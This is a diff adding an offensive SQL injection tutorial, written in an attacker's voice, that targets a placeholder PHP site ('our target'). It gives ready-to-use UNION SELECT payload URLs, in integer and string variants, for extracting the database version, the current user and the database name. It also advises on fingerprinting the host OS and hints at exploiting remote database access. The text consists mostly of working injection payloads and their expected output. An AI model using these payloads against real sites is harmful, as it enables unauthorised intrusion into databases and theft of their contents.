@@ -1,0 +1,38 @@
+UNION SELECT TO FIND VERSION, CURRENT DATABASE, CURRENT USER:
+
+Site: http://www.site.com/index.php?id=725
+Column Count: 5
+Vulnerable Columns: 2,4,5
+
+OK, so we found some information about our target to indicate it is vulnerable to SQLi so lets now check to see how vulnerable it really is and what all we can find. We will first check the Database version to determine which method we will use to extract information in next steps, as the methods used will differ based on version (>=5 OR <5). In order to do this we will use our UNION SELECT statement to find out the version info first, like so:
+                
+		INTEGER: http://www.site.com/index.php?id=-725+UNION+SELECT+1,@@version,3,4,5--
+               STRING: http://www.site.com/index.php?id=-725'+UNION+SELECT+1,@@version,3,4,5--+-
+
+NOTE: if you don’t get positive results with the above you can swap "@@version" for "version()". Depending on the system configuration it may prefer the @@ or the () calls, so make sure to test both if you’re not having any luck.
+
+You should get some type of result displayed where it previously showed the number 2, since in this case we have replaced the column2 with our request for version(). You should see something along the lines of one of these which will indicate the version number:
+
+·         4.1-log
+·         4.3
+·         5.1.52
+·         5.0.75-0ubuntu10
+·         5.0.77
+·         5.0.91-log
+·         5.0.92-community-log
+
+NOTE: you can make assumptions about the host OS based on some of the trailing tags to the version. i.e. "-log" and "community-log" tend to indicate a Windows based host OS, while things like "0ubuntu10" tend to indicate a Linux Ubuntu based OS.
+
+
+OK, now we know the version number...let’s also check to see what the current database is and who the current user is. We will accomplish this by adding in the request statements for user and current database, like so:
+
+INTEGER: http://www.site.com/index.php?id=-725+UNION+SELECT+1,version(),3,user(),database()--
+STRING: http://www.site.com/index.php?id=-725'+UNION+SELECT+1,version(),3,user(),database()--+-
+
+We should now see the numbers that were indicating our vulnerable columns now change to display the requested data, which in this case was version, user, and current database. You results should look something like this:
+
+                version=5.0.92-community-log
+                user=username@localhost OR username@% OR username@there.actual.ip.address
+
+NOTE: If you see the "@%" of "@there.actual.ip.address" then this is a strong indication that the actual database server will allow remote connections to be established(hint hint, wink wink), while "@localhost" typically indicates you can only make connections to the DB from the host machine itself
+current database=whatever they have happened to name the current database (this refers to the one that is actually being used to serve the web content for the active page you are using to inject on, as there may be many other databases actually available).
